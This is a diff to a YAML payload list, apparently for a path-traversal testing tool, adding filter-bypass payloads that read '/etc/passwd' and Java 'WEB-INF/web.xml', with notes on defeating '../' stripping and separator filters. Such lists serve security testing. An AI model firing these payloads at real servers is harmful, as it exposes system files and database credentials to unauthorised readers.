@@ -35,6 +35,18 @@ payloads:
     template: '%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd'
     confidence: suspected
     notes: Overlong-UTF8 dot bypass; legacy parser research.
+  - id: dotdot_slash_restripe
+    template: '....//....//....//etc/passwd'
+    confidence: likely
+    notes: Defeats single-pass "../" stripping filters — removing the inner ".." leaves a fresh "../" behind.
+  - id: java_webinf_traversal
+    template: '../../WEB-INF/web.xml'
+    confidence: likely
+    notes: Java servlet traversal target; web.xml frequently exposes DB connection strings and internal paths.
+  - id: mixed_slash_traversal
+    template: '....\/....\/....\/etc\/passwd'
+    confidence: suspected
+    notes: Mixed forward/backslash sequence bypassing separator-specific filters on polyglot parsers.
 mutations:
   - name: case_flip
     description: Path components on Windows are case-insensitive — flips for research.
